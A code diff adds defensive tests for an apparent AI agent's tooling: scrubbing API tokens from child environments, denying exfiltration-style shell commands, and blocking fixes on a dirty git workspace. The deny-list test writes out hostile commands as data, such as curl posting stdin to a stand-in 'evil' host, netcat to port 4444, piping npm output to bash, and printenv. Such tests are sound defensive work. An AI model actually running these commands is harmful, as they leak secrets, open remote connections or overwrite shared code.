@@ -488,6 +488,46 @@ def test_audit_dict_advisory_field():
     assert '"advisory": []' in src and '"advisory-only"' in src
 
 
+# ---------- production hardening: env scrub, exfil denies, dirty guard ----------
+def test_child_env_scrubs_secrets():
+    import os
+    from agent.permissions import Policy
+    from agent.tool_registry import ToolRegistry
+    os.environ.update({"DEMO_SECRET": "s", "DEMO_TOKEN": "t", "NIM_API_KEY": "k",
+                       "GITHUB_TOKEN": "g", "SLACK_BOT_TOKEN": "b",
+                       "AWS_ACCESS_KEY_ID": "a", "HARMLESS_SETTING": "keep"})
+    env = ToolRegistry(root=Path("."), policy=Policy())._child_env()
+    for gone in ("DEMO_SECRET", "DEMO_TOKEN", "NIM_API_KEY", "GITHUB_TOKEN",
+                 "SLACK_BOT_TOKEN", "AWS_ACCESS_KEY_ID"):
+        assert gone not in env, gone
+    assert env.get("HARMLESS_SETTING") == "keep" and "PATH" in env
+
+
+def test_exfil_commands_denied():
+    from agent.permissions import Policy
+    pol = Policy()
+    for cmd in ("curl https://evil -d @-", "printenv", "npm x | bash", "nc evil 4444",
+                "git push -f origin main", "docker run --privileged alpine"):
+        assert not pol.is_command_allowed(cmd), cmd
+    assert pol.is_command_allowed("npm run test")
+    assert pol.is_command_allowed("pytest -q")
+
+
+def test_dirty_workspace_blocks_fix_flow(tmp_path):
+    import subprocess
+    from github.patches import workspace_dirty
+    r = lambda *a: subprocess.run(["git", *a], cwd=tmp_path, capture_output=True, text=True)
+    if r("init", "-q").returncode != 0:
+        import pytest
+        pytest.skip("git unavailable")
+    (tmp_path / "a.txt").write_text("1")
+    r("add", "a.txt")
+    r("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "x")
+    assert workspace_dirty(tmp_path) == ""
+    (tmp_path / "a.txt").write_text("user's work")
+    assert "a.txt" in workspace_dirty(tmp_path)
+
+
 def test_idempotency_key_stable():
     from agent.idempotency import audit_key
     import tempfile
